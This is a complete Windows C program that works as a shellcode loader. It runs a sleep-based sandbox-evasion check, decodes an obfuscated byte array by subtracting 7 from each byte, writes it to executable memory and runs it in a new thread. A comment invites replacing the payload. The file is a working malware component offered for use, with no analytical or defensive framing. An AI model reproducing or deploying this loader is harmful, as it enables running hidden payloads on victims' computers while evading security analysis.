#include <Windows.h>
#include <stdio.h>

int main(int argc, char ** argv) {
    SYSTEMTIME starttime, finaltime;
    GetSystemTime(&starttime);
    Sleep(10000);
    GetSystemTime(&finaltime);
    if (abs(finaltime.wSecond - starttime.wSecond) < 9.5) {
        return 1;
    }

    // Change shellcode here, or modify the program to accept payload from argv
    unsigned char shellcode[] = { 0x4f, 0x38, 0xd0, 0x4f, 0x88, 0xf0, 0xbb, 0x6, 0x6, 0x6, 0x4f, 0x94, 0xc, 0xf6, 0x6, 0x6, 0x6, 0x4f, 0xc2, 0xc6, 0xea, 0x31, 0x93, 0x9a, 0xef, 0x5, 0xd6, 0x4f, 0x38, 0x5f, 0x2e, 0x4f, 0x34, 0xff, 0x6, 0x6, 0x6, 0xe9, 0xfb, 0x4a, 0xb2, 0xb0, 0x6f, 0x6a, 0x7, 0x39, 0xd6, 0xc6, 0xea, 0x72, 0xe4, 0xd9, 0xbf, 0xb3, 0xa5, 0xf0, 0xb2, 0x22, 0x65, 0xfd, 0xa7, 0x7c, 0xa4, 0xe6, 0xb2, 0xa8, 0xe5, 0x92, 0xa7, 0x7c, 0xa4, 0xa6, 0xb2, 0xa8, 0x5, 0xca, 0xac, 0xd6, 0xd, 0xfe, 0xf3, 0xa4, 0xcd, 0xe0, 0xa7, 0xd6, 0x16, 0x1a, 0xe6, 0x52, 0xf7, 0x98, 0xcb, 0xe5, 0x95, 0x85, 0x31, 0x2e, 0xd4, 0x99, 0x30, 0x23, 0x29, 0xf4, 0xb2, 0xa8, 0xe5, 0xba, 0x6a, 0xc3, 0xfa, 0x5, 0xb9, 0x69, 0x94, 0x4a, 0x95, 0x86, 0xbe, 0xae, 0xef, 0x2f, 0x8a, 0x1d, 0xa1, 0x5, 0xd6, 0xc6, 0x6f, 0xb1, 0xb, 0x9a, 0xef, 0x5, 0x8e, 0x41, 0x2a, 0x65, 0xf2, 0xe2, 0xf0, 0x35, 0xa6, 0x3b, 0xb2, 0x39, 0xcf, 0x1f, 0xaf, 0xe5, 0x8d, 0xc5, 0x3a, 0xd0, 0xe1, 0xe5, 0xe0, 0x3e, 0x8e, 0x47, 0x31, 0x72, 0xe, 0xae, 0x67, 0xbd, 0xd5, 0x70, 0xb2, 0x22, 0x53, 0x46, 0xb0, 0x46, 0xd, 0xb9, 0xa9, 0x32, 0x54, 0xb2, 0xf, 0x92, 0x45, 0xfa, 0xe7, 0x6d, 0xaf, 0xa2, 0xb4, 0xce, 0x25, 0xd1, 0x42, 0x79, 0xcf, 0x1f, 0xaf, 0xe1, 0x8d, 0xc5, 0x3a, 0x53, 0xd4, 0x1f, 0xeb, 0xbd, 0x92, 0x3b, 0xaa, 0x3d, 0xcc, 0x99, 0x3f, 0xc6, 0x4b, 0xc2, 0x72, 0x69, 0x94, 0x4a, 0xb0, 0xad, 0x95, 0xee, 0xc4, 0x7a, 0xdd, 0xd9, 0xb7, 0xc6, 0x9d, 0x5, 0xc0, 0x69, 0x16, 0x86, 0xcf, 0xc6, 0xa4, 0x47, 0xa, 0x79, 0xd4, 0xd1, 0xb9, 0xbd, 0x4b, 0xb4, 0x11, 0x68, 0x7a, 0x73, 0x1e, 0xaa, 0x8e, 0x95, 0x3f, 0x80, 0xcc, 0x34, 0xa6, 0x9e, 0xa8, 0xdd, 0x94, 0x56, 0xff, 0x9a, 0xb0, 0xaf, 0x8e, 0x3d, 0x9, 0x6a, 0x52, 0x58, 0xab, 0x90, 0xf0, 0xbf, 0x23, 0x6, 0xe6, 0xc7, 0xa7, 0x7e, 0x35, 0xf3, 0xc0, 0x6e, 0xc4, 0x5a, 0xac, 0xd6, 0xd, 0xf3, 0xb7, 0x6a, 0x3d, 0xb0, 0xc5, 0x8e, 0x6f, 0xc6, 0xea, 0x31, 0x93, 0x73, 0x44, 0x1d, 0xca, 0xc6, 0xea, 0x31, 0xc4, 0xb1, 0xe1, 0xd7, 0x5, 0x90, 0xe2, 0xb, 0xc3, 0xc4, 0xd7, 0x5, 0x9c, 0xfe, 0x71, 0xf2, 0xcc, 0x5b, 0x2f, 0x4c, 0xd5, 0xc6, 0xea, 0x6e, 0xc4, 0x61, 0xc2, 0xb4, 0xac, 0xc3, 0xb7, 0x6a, 0x3d, 0xcb, 0x68, 0x68, 0x10, 0xc6, 0xea, 0x31, 0x93, 0x73, 0x44, 0x1d, 0x4, 0xc6, 0xea, 0x31, 0xaa, 0xce, 0xa2, 0xc0, 0x8a, 0x95, 0xbc, 0x7c, 0xeb, 0xaa, 0xa8, 0xb3, 0xb4, 0xf8, 0x96, 0x4c, 0xc3, 0xe3, 0x94, 0xb1, 0xa8, 0xfe, 0xa9, 0x86, 0xfc, 0xf1, 0xc6, 0x92, 0x5, 0xf2, 0xab, 0x7a, 0xd0, 0xc8, 0xe6, 0xa1, 0xb2, 0xd8, 0xb9, 0x6f, 00, 0xcd, 0xa1, 0xa6, 0xae, 0xd1, 0xd7, 0x4f, 0xe4, 0x9a, 0xa7, 0x7e, 0x15, 0xf3, 0xc0, 0x72, 0xdb, 0xe5, 0xe0, 0x3e, 0xa3, 0xfe, 0x62, 0x31, 0xc5, 0x42, 0x73, 0x5, 0xd6, 0xc6, 0xea, 0x81, 0xe6, 0xc7, 0xa8, 0x40, 0x14, 0x5b, 0xbd, 0xb, 0xbe, 0x73, 0x44, 0xbd, 0x4d, 0x80, 0x90, 0x27, 0xda, 0xe2, 0x68, 0x16, 0xac, 0xa7, 0xc0, 0x7f, 0xeb, 0x1a, 0xe2, 0x5, 0xd6, 0xfd, 0x71, 0xd1, 0xed, 0x9e, 0xb0, 0xae, 0x8d, 0xc, 0x9d, 0x73, 0x19, 0x1c, 0xef, 0x5, 0xd6, 0xc6, 0x23, 0x6, 0xc8, 0xa9, 0x2f, 0xb4, 0x9c, 0xfe, 0x71, 0xe2, 0xc8, 0xa9, 0x28, 0xba, 0x5, 0x7d, 0xb7, 0x80, 0xcc, 0x5b, 0x31, 0xda, 0xd0, 0xae, 0x9f, 0xdc, 0x60, 0x1d, 0x2f, 0x92, 0xd7, 0xfe, 0x2b, 0xf2, 0xb, 0x87, 0xef, 0x5, 0x8d, 0xc, 0xae, 0xe1, 0xc0, 0x7a, 0xef, 0x5, 0xd6, 0xc6, 0x23, 0x6, 0xcb, 0x73, 0x2e, 0x91, 0xd4, 0x5b, 0x50, 0xc9, 0xe0, 0x9a, 0xef, 0x5, 0xa3, 0xed, 0x90, 0x71, 0xdd, 0xe1, 0x68, 0x36, 0x15, 0x64, 0xfa, 0x6a, 0x52, 0x5a, 0xef, 0xf5, 0xd6, 0xc6, 0xb1, 0x97, 0xdb, 0x3e, 0xc2, 0x22, 0xd6, 0xc6, 0xea, 0x31, 0x7a, 0x4d, 0xa7, 0x74, 0xa3, 0xf3, 0xb2, 0xaa, 0x72, 0xe2, 0x68, 0x16, 0x8e, 0x3d, 0x40, 0x6a, 0x52, 0x5a, 0xef, 0xe5, 0xd6, 0xc6, 0xb1, 0xaa, 0x7c, 0xe1, 0x59, 0xf3, 0x60, 0x3d, 0x8, 0x31, 0x93, 0x9a, 0xef, 0x8, 0x21, 0xfe, 0x67, 0xf5, 0xb3, 0x1d, 0x2f, 0x91, 0x84, 0xe0, 0x6f, 0x34, 0xcb, 0x99, 0x32, 0x82, 0x16, 0xd1, 0x38, 0x79, 0x56, 0xd2, 0x89, 0x5, 0x9d, 0xfd, 0x2b, 0xef, 0x83, 0x2d, 0x51, 0xaf, 0x37, 0x71, 0xea, 0x31, 0x93, 0x9a, 0xef, 0x5, 0xd6, 0x7 };

    for (unsigned int i = 0; i < sizeof shellcode; i++) {
        shellcode[i] -= 7;
    }

	unsigned char * mem = (unsigned char *) VirtualAlloc(NULL, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!mem) {
		printf("Erro: %d\n", GetLastError());
		return 1;
	}

	memcpy(mem, shellcode, sizeof shellcode);

	HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) mem, NULL, 0, NULL);
	WaitForSingleObject(thread, INFINITE);
	return 0;
}
